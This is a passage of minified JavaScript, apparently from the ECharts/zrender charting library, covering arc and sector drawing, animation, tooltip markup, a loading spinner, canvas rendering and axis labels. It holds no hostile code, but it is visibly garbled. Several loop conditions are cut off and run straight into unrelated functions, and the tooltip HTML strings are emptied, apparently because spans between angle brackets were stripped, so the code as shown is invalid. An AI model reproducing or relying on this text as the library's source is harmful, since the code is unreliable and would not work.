h=e.cx,c=e.cy,p=!!e.clockwise,d=rS(u-l),f=d>Jw&&d%Jw;if(f>lS&&(d=f),i>lS)if(d>Jw-lS)t.moveTo(h+i*eS(l),c+i*tS(l)),t.arc(h,c,i,l,u,!p),r>lS&&(t.moveTo(h+r*eS(u),c+r*tS(u)),t.arc(h,c,r,u,l,p));else{var g=void 0,v=void 0,y=void 0,m=void 0,_=void 0,x=void 0,b=void 0,w=void 0,S=void 0,M=void 0,T=void 0,C=void 0,I=void 0,D=void 0,k=void 0,A=void 0,L=i*eS(l),P=i*tS(l),O=r*eS(u),R=r*tS(u),E=d>lS;if(E){var N=e.cornerRadius;N&&(n=$a(N),g=n[0],v=n[1],y=n[2],m=n[3]);var z=rS(i-r)/2;if(_=sS(z,y),x=sS(z,m),b=sS(z,g),w=sS(z,v),T=S=aS(_,x),C=M=aS(b,w),(S>lS||M>lS)&&(I=i*eS(u),D=i*tS(u),k=r*eS(l),A=r*tS(l),Qw>d)){var B=Za(L,P,k,A,I,D,O,R);if(B){var F=L-B[0],V=P-B[1],H=I-B[0],G=D-B[1],W=1/tS(nS((F*H+V*G)/(oS(F*F+V*V)*oS(H*H+G*G)))/2),U=oS(B[0]*B[0]+B[1]*B[1]);T=sS(S,(i-U)/(W+1)),C=sS(M,(r-U)/(W-1))}}}if(E)if(T>lS){var X=sS(y,T),Y=sS(m,T),q=Ka(k,A,L,P,i,X,p),j=Ka(I,D,O,R,i,Y,p);t.moveTo(h+q.cx+q.x0,c+q.cy+q.y0),S>T&&X===Y?t.arc(h+q.cx,c+q.cy,T,iS(q.y0,q.x0),iS(j.y0,j.x0),!p):(X>0&&t.arc(h+q.cx,c+q.cy,X,iS(q.y0,q.x0),iS(q.y1,q.x1),!p),t.arc(h,c,i,iS(q.cy+q.y1,q.cx+q.x1),iS(j.cy+j.y1,j.cx+j.x1),!p),Y>0&&t.arc(h+j.cx,c+j.cy,Y,iS(j.y1,j.x1),iS(j.y0,j.x0),!p))}else t.moveTo(h+L,c+P),t.arc(h,c,i,l,u,!p);else t.moveTo(h+L,c+P);if(r>lS&&E)if(C>lS){var X=sS(g,C),Y=sS(v,C),q=Ka(O,R,I,D,r,-Y,p),j=Ka(L,P,k,A,r,-X,p);t.lineTo(h+q.cx+q.x0,c+q.cy+q.y0),M>C&&X===Y?t.arc(h+q.cx,c+q.cy,C,iS(q.y0,q.x0),iS(j.y0,j.x0),!p):(Y>0&&t.arc(h+q.cx,c+q.cy,Y,iS(q.y0,q.x0),iS(q.y1,q.x1),!p),t.arc(h,c,r,iS(q.cy+q.y1,q.cx+q.x1),iS(j.cy+j.y1,j.cx+j.x1),p),X>0&&t.arc(h+j.cx,c+j.cy,X,iS(j.y1,j.x1),iS(j.y0,j.x0),!p))}else t.lineTo(h+O,c+R),t.arc(h,c,r,u,l,p);else t.lineTo(h+O,c+R)}else t.moveTo(h,c);t.closePath()}}}function Ja(t,e,n,i){var r,o,a,s,l=[],u=[],h=[],c=[];if(i){a=[1/0,1/0],s=[-1/0,-1/0];for(var p=0,d=t.length;d>p;p++)ye(a,a,t[p]),me(s,s,t[p]);ye(a,a,i[0]),me(s,s,i[1])}for(var p=0,d=t.length;d>p;p++){var f=t[p];if(n)r=t[p?p-1:d-1],o=t[(p+1)%d];else{if(0===p||p===d-1){l.push(te(t[p]));continue}r=t[p-1],o=t[p+1]}re(u,o,r),he(u,u,e);var g=pe(f,r),v=pe(f,o),y=g+v;0!==y&&(g/=y,v/=y),he(h,u,-g),he(c,u,v);var m=ne([],f,h),_=ne([],f,c);i&&(me(m,m,a),ye(m,m,s),me(_,_,a),ye(_,_,s)),l.push(m),l.push(_)}return n&&l.push(l.shift()),l}function ts(t,e,n){var i=e.smooth,r=e.points;if(r&&r.length>=2){if(i){var o=Ja(r,i,n,e.smoothConstraint);t.moveTo(r[0][0],r[0][1]);for(var a=r.length,s=0;(n?a:a-1)>s;s++){var l=o[2*s],u=o[2*s+1],h=r[(s+1)%a];t.bezierCurveTo(l[0],l[1],u[0],u[1],h[0],h[1])}}else{t.moveTo(r[0][0],r[0][1]);for(var s=1,c=r.length;c>s;s++)t.lineTo(r[s][0],r[s][1])}n&&t.closePath()}}function es(t,e,n){var i=t.cpx2,r=t.cpy2;return null!=i||null!=r?[(n?Qe:$e)(t.x1,t.cpx1,t.cpx2,t.x2,e),(n?Qe:$e)(t.y1,t.cpy1,t.cpy2,t.y2,e)]:[(n?an:on)(t.x1,t.cpx1,t.x2,e),(n?an:on)(t.y1,t.cpy1,t.y2,e)]}function ns(t,e,n,i,r){var o;if(e&&e.ecModel){var a=e.ecModel.getUpdatePayload();o=a&&a.animation}var s=e&&e.isAnimationEnabled(),l=\"update\"===t;if(s){var u=void 0,h=void 0,c=void 0;i?(u=B(i.duration,200),h=B(i.easing,\"cubicOut\"),c=0):(u=e.getShallow(l?\"animationDurationUpdate\":\"animationDuration\"),h=e.getShallow(l?\"animationEasingUpdate\":\"animationEasing\"),c=e.getShallow(l?\"animationDelayUpdate\":\"animationDelay\")),o&&(null!=o.duration&&(u=o.duration),null!=o.easing&&(h=o.easing),null!=o.delay&&(c=o.delay)),T(c)&&(c=c(n,r)),T(u)&&(u=u(n));var p={duration:u||0,delay:c,easing:h};return p}return null}function is(t,e,n,i,r,o,a){var s,l=!1;T(r)?(a=o,o=r,r=null):k(r)&&(o=r.cb,a=r.during,l=r.isFrom,s=r.removeOpt,r=r.dataIndex);var u=\"leave\"===t;u||e.stopAnimation(\"leave\");var h=ns(t,i,r,u?s||{}:null,i&&i.getAnimationDelayParams?i.getAnimationDelayParams(e,r):null);if(h&&h.duration>0){var c=h.duration,p=h.delay,d=h.easing,f={duration:c,delay:p||0,easing:d,done:o,force:!!o||!!a,setToFinal:!u,scope:t,during:a};l?e.animateFrom(n,f):e.animateTo(n,f)}else e.stopAnimation(),!l&&e.attr(n),a&&a(1),o&&o()}function rs(t,e,n,i,r,o){is(\"update\",t,e,n,i,r,o)}function os(t,e,n,i,r,o){is(\"enter\",t,e,n,i,r,o)}function as(t){if(!t.__zr)return!0;for(var e=0;e0?\"right\":\"left\":o[1]>0?\"bottom\":\"top\"}function Ms(t){return!t.isGroup}function Ts(t){return null!=t.shape}function Cs(t,e,n){function i(t){var e={};return t.traverse(function(t){Ms(t)&&t.anid&&(e[t.anid]=t)}),e}function r(t){var e={x:t.x,y:t.y,rotation:t.rotation};return Ts(t)&&(e.shape=h({},t.shape)),e}if(t&&e){var o=i(t);e.traverse(function(t){if(Ms(t)&&t.anid){var e=o[t.anid];if(e){var i=r(t);t.attr(r(e)),rs(t,i,n,vw(t).dataIndex)}}})}}function Is(t,e){return y(t,function(t){var n=t[0];n=zS(n,e.x),n=BS(n,e.x+e.width);var i=t[1];return i=zS(i,e.y),i=BS(i,e.y+e.height),[n,i]})}function Ds(t,e){var n=zS(t.x,e.x),i=BS(t.x+t.width,e.x+e.width),r=zS(t.y,e.y),o=BS(t.y+t.height,e.y+e.height);return i>=n&&o>=r?{x:n,y:r,width:i-n,height:o-r}:void 0}function ks(t,e,n){var i=h({rectHover:!0},e),r=i.style={strokeNoScale:!0};return n=n||{x:-1,y:-1,width:2,height:2},t?0===t.indexOf(\"image://\")?(r.image=t.slice(8),c(r,n),new rw(i)):gs(t.replace(\"path://\",\"\"),i,n,\"center\"):void 0}function As(t,e,n,i,r){for(var o=0,a=r[r.length-1];og||g>1)return!1;var v=Ps(d,f,h,c)/p;return 0>v||v>1?!1:!0}function Ps(t,e,n,i){return t*i-n*e}function Os(t){return 1e-6>=t&&t>=-1e-6}function Rs(t){var e=t.itemTooltipOption,n=t.componentModel,i=t.itemName,r=C(e)?{formatter:e}:e,o=n.mainType,a=n.componentIndex,s={componentType:o,name:i,$vars:[\"name\"]};s[o+\"Index\"]=a;var l=t.formatterParamsExtra;l&&v(b(l),function(t){K(s,t)||(s[t]=l[t],s.$vars.push(t))});var u=vw(t.el);u.componentMainType=o,u.componentIndex=a,u.tooltipConfig={name:i,option:c({content:i,formatterParams:s},r)}}function Es(t,e){var n;t.isGroup&&(n=e(t)),n||t.traverse(e)}function Ns(t,e){if(t)if(M(t))for(var n=0;n=t:t===e}function lu(t,e){return t.join(\",\")===e.join(\",\")}function uu(t){var e=t&&t.itemStyle;if(e)for(var n=0,i=mT.length;i>n;n++){var r=mT[n],o=e.normal,a=e.emphasis;o&&o[r]&&(t[r]=t[r]||{},t[r].normal?l(t[r].normal,o[r]):t[r].normal=o[r],o[r]=null),a&&a[r]&&(t[r]=t[r]||{},t[r].emphasis?l(t[r].emphasis,a[r]):t[r].emphasis=a[r],a[r]=null)}}function hu(t,e,n){if(t&&t[e]&&(t[e].normal||t[e].emphasis)){var i=t[e].normal,r=t[e].emphasis;i&&(n?(t[e].normal=t[e].emphasis=null,c(t[e],i)):t[e]=i),r&&(t.emphasis=t.emphasis||{},t.emphasis[e]=r,r.focus&&(t.emphasis.focus=r.focus),r.blurScope&&(t.emphasis.blurScope=r.blurScope))}}function cu(t){hu(t,\"itemStyle\"),hu(t,\"lineStyle\"),hu(t,\"areaStyle\"),hu(t,\"label\"),hu(t,\"labelLine\"),hu(t,\"upperLabel\"),hu(t,\"edgeLabel\")}function pu(t,e){var n=yT(t)&&t[e],i=yT(n)&&n.textStyle;if(i)for(var r=0,o=Yx.length;o>r;r++){var a=Yx[r];i.hasOwnProperty(a)&&(n[a]=i[a])}}function du(t){t&&(cu(t),pu(t,\"label\"),t.emphasis&&pu(t.emphasis,\"label\"))}function fu(t){if(yT(t)){uu(t),cu(t),pu(t,\"label\"),pu(t,\"upperLabel\"),pu(t,\"edgeLabel\"),t.emphasis&&(pu(t.emphasis,\"label\"),pu(t.emphasis,\"upperLabel\"),pu(t.emphasis,\"edgeLabel\"));var e=t.markPoint;e&&(uu(e),du(e));var n=t.markLine;n&&(uu(n),du(n));var i=t.markArea;i&&du(i);var r=t.data;if(\"graph\"===t.type){r=r||t.nodes;var o=t.links||t.edges;if(o&&!L(o))for(var a=0;au;u++)l[u]=a[u];t[e]=l}}else t[e]=new o(i)}function ah(t){var e=t.option.transform;e&&U(t.option.transform)}function sh(t){return\"series\"===t.mainType}function lh(t){throw new Error(t)}function uh(t,e){var n=t.color||\"#6e7079\",i=t.fontSize||12,r=t.fontWeight||\"400\",o=t.color||\"#464646\",a=t.fontSize||14,s=t.fontWeight||\"900\";return\"html\"===e?{nameStyle:\"font-size:\"+Dl(i+\"\")+\"px;color:\"+Dl(n)+\";font-weight:\"+Dl(r+\"\"),valueStyle:\"font-size:\"+Dl(a+\"\")+\"px;color:\"+Dl(o)+\";font-weight:\"+Dl(s+\"\")}:{nameStyle:{fontSize:i,fill:n,fontWeight:r},valueStyle:{fontSize:a,fill:o,fontWeight:s}}}function hh(t,e){return e.type=t,e}function ch(t){return\"section\"===t.type}function ph(t){return ch(t)?fh:gh}function dh(t){if(ch(t)){var e=0,n=t.blocks.length,i=n>1||n>0&&!t.noHeader;return v(t.blocks,function(t){var n=dh(t);n>=e&&(e=n+ +(i&&(!n||ch(t)&&!t.noHeader)))}),e}return 0}function fh(t,e,n,i){var r=e.noHeader,o=yh(dh(e)),a=[],s=e.blocks||[];G(!s||M(s)),s=s||[];var l=t.orderMode;if(e.sortBlocks&&l){s=s.slice();var u={valueAsc:\"asc\",valueDesc:\"desc\"};if(K(u,l)){var c=new ET(u[l],null);s.sort(function(t,e){return c.evaluate(t.sortParam,e.sortParam)})}else\"seriesDesc\"===l&&s.reverse()}v(s,function(n,r){var s=e.valueFormatter,l=ph(n)(s?h(h({},t),{valueFormatter:s}):t,n,r>0?o.html:0,i);null!=l&&a.push(l)});var p=\"richText\"===t.renderMode?a.join(o.richText):mh(a.join(\"\"),r?n:o.html);if(r)return p;var d=kl(e.header,\"ordinal\",t.useUTC),f=uh(i,t.renderMode).nameStyle;return\"richText\"===t.renderMode?bh(t,d,f)+o.richText+p:mh(''+Dl(d)+\"\"+p,n)}function gh(t,e,n,i){var r=t.renderMode,o=e.noName,a=e.noValue,s=!e.markerType,l=e.name,u=t.useUTC,h=e.valueFormatter||t.valueFormatter||function(t){return t=M(t)?t:[t],y(t,function(t,e){return kl(t,M(d)?d[e]:d,u)})};if(!o||!a){var c=s?\"\":t.markupStyleCreator.makeTooltipMarker(e.markerType,e.markerColor||\"#333\",r),p=o?\"\":kl(l,\"ordinal\",u),d=e.valueType,f=a?[]:h(e.value),g=!s||!o,v=!s&&o,m=uh(i,r),_=m.nameStyle,x=m.valueStyle;return\"richText\"===r?(s?\"\":c)+(o?\"\":bh(t,p,_))+(a?\"\":wh(t,f,g,v,x)):mh((s?\"\":c)+(o?\"\":_h(p,!s,_))+(a?\"\":xh(f,g,v,x)),n)}}function vh(t,e,n,i,r,o){if(t){var a=ph(t),s={useUTC:r,renderMode:n,orderMode:i,markupStyleCreator:e,valueFormatter:t.valueFormatter};return a(s,t,0,o)}}function yh(t){return{html:qT[t],richText:jT[t]}}function mh(t,e){var n='',i=\"margin: \"+e+\"px 0 0\";return''+t+n+\"\"}function _h(t,e,n){var i=e?\"margin-left:2px\":\"\";return''+Dl(t)+\"\"}function xh(t,e,n,i){var r=n?\"10px\":\"20px\",o=e?\"float:right;margin-left:\"+r:\"\";return t=M(t)?t:[t],''+y(t,function(t){return Dl(t)}).join(\"&nbsp;&nbsp;\")+\"\"}function bh(t,e,n){return t.markupStyleCreator.wrapRichTextStyle(e,n)}function wh(t,e,n,i,r){var o=[r],a=i?10:20;return n&&o.push({padding:[0,0,0,a],align:\"right\"}),t.markupStyleCreator.wrapRichTextStyle(M(e)?e.join(\" \"):e,o)}function Sh(t,e){var n=t.getData().getItemVisual(e,\"style\"),i=n[t.visualDrawType];return Rl(i)}function Mh(t,e){var n=t.get(\"padding\");return null!=n?n:\"richText\"===e?[8,10]:10}function Th(t){var e,n,i,r,o=t.series,a=t.dataIndex,s=t.multipleSeries,l=o.getData(),u=l.mapDimensionsAll(\"defaultedTooltip\"),h=u.length,c=o.getRawValue(a),p=M(c),d=Sh(o,a);if(h>1||p&&!h){var f=Ch(c,o,a,u,d);e=f.inlineValues,n=f.inlineValueTypes,i=f.blocks,r=f.inlineValues[0]}else if(h){var g=l.getDimensionInfo(u[0]);r=e=Wu(l,a,u[0]),n=g.type}else r=e=p?c[0]:c;var v=Sr(o),y=v&&o.name||\"\",m=l.getName(a),_=s?y:m;return hh(\"section\",{header:y,noHeader:s||!v,sortParam:r,blocks:[hh(\"nameValue\",{markerType:\"item\",markerColor:d,name:_,noName:!W(_),value:e,valueType:n})].concat(i||[])})}function Ch(t,e,n,i,r){function o(t,e){var n=a.getDimensionInfo(e);n&&n.otherDims.tooltip!==!1&&(s?h.push(hh(\"nameValue\",{markerType:\"subItem\",markerColor:r,name:n.displayName,value:t,valueType:n.type})):(l.push(t),u.push(n.type)))}var a=e.getData(),s=m(t,function(t,e,n){var i=a.getDimensionInfo(n);return t=t||i&&i.tooltip!==!1&&null!=i.displayName},!1),l=[],u=[],h=[];return i.length?v(i,function(t){o(Wu(a,n,t),t)}):v(t,o),{inlineValues:l,inlineValueTypes:u,blocks:h}}function Ih(t,e){return t.getName(e)||t.getId(e)}function Dh(t){var e=t.name;Sr(t)||(t.name=kh(t)||e)}function kh(t){var e=t.getRawData(),n=e.mapDimensionsAll(\"seriesName\"),i=[];return v(n,function(t){var n=e.getDimensionInfo(t);n.displayName&&i.push(n.displayName)}),i.join(\" \")}function Ah(t){return t.model.getRawData().count()}function Lh(t){var e=t.model;return e.setData(e.getRawData().cloneShallow()),Ph}function Ph(t,e){e.outputData&&t.end>e.outputData.count()&&e.model.getRawData().cloneShallow(e.outputData)}function Oh(t,e){v(q(t.CHANGABLE_METHODS,t.DOWNSAMPLE_METHODS),function(n){t.wrapMethod(n,S(Rh,e))})}function Rh(t,e){var n=Eh(t);return n&&n.setOutputEnd((e||this).count()),e}function Eh(t){var e=(t.ecModel||{}).scheduler,n=e&&e.getPipeline(t.uid);if(n){var i=n.currentTask;if(i){var r=i.agentStubMap;r&&(i=r.get(t.uid))}return i}}function Nh(){var t=Dr();return function(e){var n=t(e),i=e.pipelineContext,r=!!n.large,o=!!n.progressiveRender,a=n.large=!(!i||!i.large),s=n.progressiveRender=!(!i||!i.progressiveRender);return!(r===a&&o===s)&&\"reset\"}}function zh(t,e,n){t&&Oa(t)&&(\"emphasis\"===e?ha:ca)(t,n)}function Bh(t,e,n){var i=Ir(t,e),r=e&&null!=e.highlightKey?Ra(e.highlightKey):null;null!=i?v(ur(i),function(e){zh(t.getItemGraphicEl(e),n,r)}):t.eachItemGraphicEl(function(t){zh(t,n,r)})}function Fh(t){return eC(t.model)}function Vh(t){var e=t.model,n=t.ecModel,i=t.api,r=t.payload,o=e.pipelineContext.progressiveRender,a=t.view,s=r&&tC(r).updateMethod,l=o?\"incrementalPrepareRender\":s&&a[s]?s:\"render\";return\"render\"!==l&&a[l](e,n,i,r),rC[l]}function Hh(t,e,n){function i(){h=(new Date).getTime(),c=null,t.apply(a,s||[])}var r,o,a,s,l,u=0,h=0,c=null;e=e||0;var p=function(){for(var t=[],p=0;p=0?i():c=setTimeout(i,-o),u=r};return p.clear=function(){c&&(clearTimeout(c),c=null)},p.debounceNextCall=function(t){l=t},p}function Gh(t,e,n,i){var r=t[e];if(r){var o=r[oC]||r,a=r[sC],s=r[aC];if(s!==n||a!==i){if(null==n||!i)return t[e]=o;r=t[e]=Hh(o,n,\"debounce\"===i),r[oC]=o,r[sC]=i,r[aC]=n}return r}}function Wh(t,e){var n=t[e];n&&n[oC]&&(n.clear&&n.clear(),t[e]=n[oC])}function Uh(t,e){var n=t.visualStyleMapper||uC[e];return n?n:(console.warn(\"Unkown style type '\"+e+\"'.\"),uC.itemStyle)}function Xh(t,e){var n=t.visualDrawType||hC[e];return n?n:(console.warn(\"Unkown style type '\"+e+\"'.\"),\"fill\")}function Yh(t,e){e=e||{},c(e,{text:\"loading\",textColor:\"#000\",fontSize:12,fontWeight:\"normal\",fontStyle:\"normal\",fontFamily:\"sans-serif\",maskColor:\"rgba(255, 255, 255, 0.8)\",showSpinner:!0,color:\"#5470c6\",spinnerRadius:10,lineWidth:5,zlevel:0});var n=new Rx,i=new lw({style:{fill:e.maskColor},zlevel:e.zlevel,z:1e4});n.add(i);var r=new pw({style:{text:e.text,fill:e.textColor,fontSize:e.fontSize,fontWeight:e.fontWeight,fontStyle:e.fontStyle,fontFamily:e.fontFamily},zlevel:e.zlevel,z:10001}),o=new lw({style:{fill:\"none\"},textContent:r,textConfig:{position:\"right\",distance:10},zlevel:e.zlevel,z:10001});n.add(o);var a;return e.showSpinner&&(a=new MS({shape:{startAngle:-gC/2,endAngle:-gC/2+.1,r:e.spinnerRadius},style:{stroke:e.color,lineCap:\"round\",lineWidth:e.lineWidth},zlevel:e.zlevel,z:10001}),a.animateShape(!0).when(1e3,{endAngle:3*gC/2}).start(\"circularInOut\"),a.animateShape(!0).when(1e3,{startAngle:3*gC/2}).delay(300).start(\"circularInOut\"),n.add(a)),n.resize=function(){var n=r.getBoundingRect().width,s=e.showSpinner?e.spinnerRadius:0,l=(t.getWidth()-2*s-(e.showSpinner&&n?10:0)-n)/2-(e.showSpinner&&n?0:5+n/2)+(e.showSpinner?0:n/2)+(n?0:s),u=t.getHeight()/2;e.showSpinner&&a.setShape({cx:l,cy:u}),o.setShape({x:l-s,y:u-s,width:2*s,height:2*s}),i.setShape({x:0,y:0,width:t.getWidth(),height:t.getHeight()})},n.resize(),n}function qh(t){t.overallReset(t.ecModel,t.api,t.payload)}function jh(t){return t.overallProgress&&Zh}function Zh(){this.agent.dirty(),this.getDownstream().dirty()}function Kh(){this.agent&&this.agent.dirty()}function $h(t){return t.plan?t.plan(t.model,t.ecModel,t.api,t.payload):null}function Qh(t){t.useClearVisual&&t.data.clearAllVisual();var e=t.resetDefines=ur(t.reset(t.model,t.ecModel,t.api,t.payload));return e.length>1?y(e,function(t,e){return Jh(e)}):yC}function Jh(t){return function(e,n){var i=n.data,r=n.resetDefines[t];if(r&&r.dataEach)for(var o=e.start;os,u=!e.path;e.silent&&!l||!u||e.createPathProxy();var h=e.path||WC,c=e.__dirty;if(!i){var p=n.fill,d=n.stroke,f=a&&!!p.colorStops,g=o&&!!d.colorStops,v=a&&!!p.image,y=o&&!!d.image,m=void 0,_=void 0,x=void 0,b=void 0,w=void 0;(f||g)&&(w=e.getBoundingRect()),f&&(m=c?gc(t,p,w):e.__canvasFillGradient,e.__canvasFillGradient=m),g&&(_=c?gc(t,d,w):e.__canvasStrokeGradient,e.__canvasStrokeGradient=_),v&&(x=c||!e.__canvasFillPattern?Cc(t,p,e):e.__canvasFillPattern,e.__canvasFillPattern=x),y&&(b=c||!e.__canvasStrokePattern?Cc(t,d,e):e.__canvasStrokePattern,e.__canvasStrokePattern=x),f?t.fillStyle=m:v&&(x?t.fillStyle=x:a=!1),g?t.strokeStyle=_:y&&(b?t.strokeStyle=b:o=!1)}var S=e.getGlobalScale();h.setScale(S[0],S[1],e.segmentIgnoreThreshold);var M,T;t.setLineDash&&n.lineDash&&(r=xc(e),M=r[0],T=r[1]);var C=!0;(u||c&l_)&&(h.setDPR(t.dpr),l?h.setContext(null):(h.setContext(t),C=!1),h.reset(),e.buildPath(h,e.shape,i),h.toStatic(),e.pathUpdated()),C&&h.rebuildPath(t,l?s:1),M&&(t.setLineDash(M),t.lineDashOffset=T),i||(n.strokeFirst?(o&&Tc(t,n),a&&Mc(t,n)):(a&&Mc(t,n),o&&Tc(t,n))),M&&t.setLineDash([])}function Dc(t,e,n){var i=e.__image=jr(n.image,e.__image,e,e.onload);if(i&&Kr(i)){var r=n.x||0,o=n.y||0,a=e.getWidth(),s=e.getHeight(),l=i.width/i.height;if(null==a&&null!=s?a=s*l:null==s&&null!=a?s=a/l:null==a&&null==s&&(a=i.width,s=i.height),n.sWidth&&n.sHeight){var u=n.sx||0,h=n.sy||0;t.drawImage(i,u,h,n.sWidth,n.sHeight,r,o,a,s)}else if(n.sx&&n.sy){var u=n.sx,h=n.sy,c=a-u,p=s-h;t.drawImage(i,u,h,c,p,r,o,a,s)}else t.drawImage(i,r,o,a,s)}}function kc(t,e,n){var i,r=n.text;if(null!=r&&(r+=\"\"),r){t.font=n.font||cm,t.textAlign=n.textAlign,t.textBaseline=n.textBaseline;var o=void 0,a=void 0;t.setLineDash&&n.lineDash&&(i=xc(e),o=i[0],a=i[1]),o&&(t.setLineDash(o),t.lineDashOffset=a),n.strokeFirst?(bc(n)&&t.strokeText(r,n.x,n.y),Sc(n)&&t.fillText(r,n.x,n.y)):(Sc(n)&&t.fillText(r,n.x,n.y),bc(n)&&t.strokeText(r,n.x,n.y)),o&&t.setLineDash([])}}function Ac(t,e,n,i,r){var o=!1;if(!i&&(n=n||{},e===n))return!1;if(i||e.opacity!==n.opacity){zc(t,r),o=!0;var a=Math.max(Math.min(e.opacity,1),0);t.globalAlpha=isNaN(a)?ub.opacity:a}(i||e.blend!==n.blend)&&(o||(zc(t,r),o=!0),t.globalCompositeOperation=e.blend||ub.blend);for(var s=0;s3.5?4:t>1.5?2:1}function _d(t){var e=30*mM;return t/=e,t>6?6:t>3?3:t>2?2:1}function xd(t){return t/=yM,t>12?12:t>6?6:t>3.5?4:t>2?2:1}function bd(t,e){return t/=e?vM:gM,t>30?30:t>20?20:t>15?15:t>10?10:t>5?5:t>2?2:1}function wd(t){return Ji(t,!0)}function Sd(t,e,n){var i=new Date(t);switch(rl(e)){case\"year\":case\"month\":i[_l(n)](0);case\"day\":i[xl(n)](1);case\"hour\":i[bl(n)](0);case\"minute\":i[wl(n)](0);case\"second\":i[Sl(n)](0),i[Ml(n)](0)}return i.getTime()}function Md(t,e,n,i){function r(t,e,n,r,o,a,s){for(var l=new Date(e),u=e,h=l[r]();n>u&&ui)}function Od(t){var e=t.getLabelModel().get(\"formatter\"),n=\"category\"===t.type?t.scale.getExtent()[0]:null;return\"time\"===t.scale.type?function(e){return function(n,i){return t.scale.getFormattedLabel(n,i,e)}}(e):C(e)?function(e){return function(n){var i=t.scale.getLabel(n),r=e.replace(\"{value}\",null!=i?i:\"\");return r}}(e):T(e)?function(e){return function(i,r){return null!=n&&(r=i.value-n),e(Rd(t,i),r,null!=i.level?{level:i.level}:null)}}(e):function(e){return t.scale.getLabel(e)}}function Rd(t,e){return\"category\"===t.type?t.scale.getLabel(e):e.value}function Ed(t){var e=t.model,n=t.scale;if(e.get([\"axisLabel\",\"show\"])&&!n.isBlank()){var i,r,o=n.getExtent();n instanceof VD?r=n.count():(i=n.getTicks(),r=i.length);var a,s=t.getLabelModel(),l=Od(t),u=1;r>40&&(u=Math.ceil(r/40));for(var h=0;r>h;h+=u){var c=i?i[h]:{value:o[0]+h},p=l(c,h),d=s.getTextRect(p),f=Nd(d,s.get(\"rotate\")||0);a?a.union(f):a=f}return a}}function Nd(t,e){var n=e*Math.PI/180,i=t.width,r=t.height,o=i*Math.abs(Math.cos(n))+Math.abs(r*Math.sin(n)),a=i*Math.abs(Math.sin(n))+Math.abs(r*Math.cos(n)),s=new Cx(t.x,t.y,o,a);return s}function zd(t){var e=t.get(\"interval\");return null==e?\"auto\":e}function Bd(t){return\"category\"===t.type&&0===zd(t.getLabelModel())}function Fd(t,e){var n={};return v(t.mapDimensionsAll(e),function(e){n[Gp(t,e)]=!0}),b(n)}function Vd(t){return Xp(null,t)}function Hd(t,e){var n=e;e instanceof oM||(n=new oM(e));var i=Ld(n);return i.setExtent(t[0],t[1]),Ad(i,n),i}function Gd(t){f(t,sk)}function Wd(t,e){return e=e||{},Hs(t,null,null,\"normal\"!==e.state)}function Ud(t){return M(t)?void v(t,function(t){Ud(t)}):void(p(hk,t)>=0||(hk.push(t),T(t)&&(t={install:t}),t.install(ck)))}function Xd(t,e){return Math.abs(t-e)0}),function(t){var n=t.properties,i=t.geometry,r=[];switch(i.type){case\"Polygon\":var o=i.coordinates;r.push(new gk(o[0],o.slice(1)));break;case\"MultiPolygon\":v(i.coordinates,function(t){t[0]&&r.push(new gk(t[0],t.slice(1)))});break;case\"LineString\":r.push(new vk([i.coordinates]));break;case\"MultiLineString\":r.push(new vk(i.coordinates))}var a=new yk(n[e||\"name\"],r,n.cp);return a.properties=n,a})}function tf(t){return\"category\"===t.type?nf(t):af(t)}function ef(t,e){return\"category\"===t.type?of(t,e):{ticks:y(t.scale.getTicks(),function(t){return t.value})}}function nf(t){var e=t.getLabelModel(),n=rf(t,e);return!e.get(\"show\")||t.scale.isBlank()?{labels:[],labelCategoryInterval:n.labelCategoryInterval}:n}function rf(t,e){var n=sf(t,\"labels\"),i=zd(e),r=lf(n,i);if(r)return r;var o,a;return T(i)?o=ff(t,i):(a=\"auto\"===i?hf(t):i,o=df(t,a)),uf(n,i,{labels:o,labelCategoryInterval:a})}function of(t,e){var n=sf(t,\"ticks\"),i=zd(e),r=lf(n,i);if(r)return r;var o,a;if((!e.get(\"show\")||t.scale.isBlank())&&(o=[]),T(i))o=ff(t,i,!0);else if(\"auto\"===i){var s=rf(t,t.getLabelModel());a=s.labelCategoryInterval,o=y(s.labels,function(t){return t.tickValue})}else a=i,o=df(t,a,!0);return uf(n,i,{ticks:o,tickCategoryInterval:a})}function af(t){var e=t.scale.getTicks(),n=Od(t);return{labels:y(e,function(e,i){return{level:e.level,formattedLabel:n(e,i),rawLabel:t.scale.getLabel(e),tickValue:e.value}})}}function sf(t,e){return Sk(t)[e]||(Sk(t)[e]=[])}function lf(t,e){for(var n=0;nt}var o=e.length;if(t.onBand&&!n&&o){var a,s,l=t.getExtent();if(1===o)e[0].coord=l[0],a=e[1]={coord:l[0]};else{var u=e[o-1].tickValue-e[0].tickValue,h=(e[o-1].coord-e[0].coord)/u;v(e,function(t){t.coord-=h/2});var c=t.scale.getExtent();s=1+c[1]-e[o-1].tickValue,a={coord:e[o-1].coord+h*s},e.push(a)}var p=l[0]>l[1];r(e[0].coord,l[0])&&(i?e[0].coord=l[0]:e.shift()),i&&r(l[0],e[0].coord)&&e.unshift({coord:l[0]}),r(l[1],a.coord)&&(i?a.coord=l[1]:e.pop()),i&&r(a.coord,l[1])&&e.push({coord:l[1]})}}function yf(t){var e=EM.extend(t);return EM.registerClass(e),e}function mf(t){var e=JT.extend(t);return JT.registerClass(e),e}function _f(t){var e=QT.extend(t);return QT.registerClass(e),e}function xf(t){var e=nC.extend(t);return nC.registerClass(e),e}function bf(t,e,n,i,r){var o=n.width,a=n.height;switch(t){case\"top\":i.set(n.x+o/2,n.y-e),r.set(0,-1);break;case\"bottom\":i.set(n.x+o/2,n.y+a+e),r.set(0,1);break;case\"left\":i.set(n.x-e,n.y+a/2),r.set(-1,0);break;case\"right\":i.set(n.x+o+e,n.y+a/2),r.set(1,0)}}function wf(t,e,n,i,r,o,a,s,l){a-=t,s-=e;var u=Math.sqrt(a*a+s*s);a/=u,s/=u;var h=a*n+t,c=s*n+e;if(Math.abs(i-r)%Ckr&&(r+=Ck);var d=Math.atan2(s,a);if(0>d&&(d+=Ck),d>=i&&r>=d||d+Ck>=i&&r>=d+Ck)return l[0]=h,l[1]=c,u-n;var f=n*Math.cos(i)+t,g=n*Math.sin(i)+e,v=n*Math.cos(r)+t,y=n*Math.sin(r)+e,m=(f-a)*(f-a)+(g-s)*(g-s),_=(v-a)*(v-a)+(y-s)*(y-s);return _>m?(l[0]=f,l[1]=g,Math.sqrt(m)):(l[0]=v,l[1]=y,Math.sqrt(_))}function Sf(t,e,n,i,r,o,a,s){var l=r-t,u=o-e,h=n-t,c=i-e,p=Math.sqrt(h*h+c*c);h/=p,c/=p;var d=l*h+u*c,f=d/p;s&&(f=Math.min(Math.max(f,0),1)),f*=p;var g=a[0]=t+f*h,v=a[1]=e+f*c;return 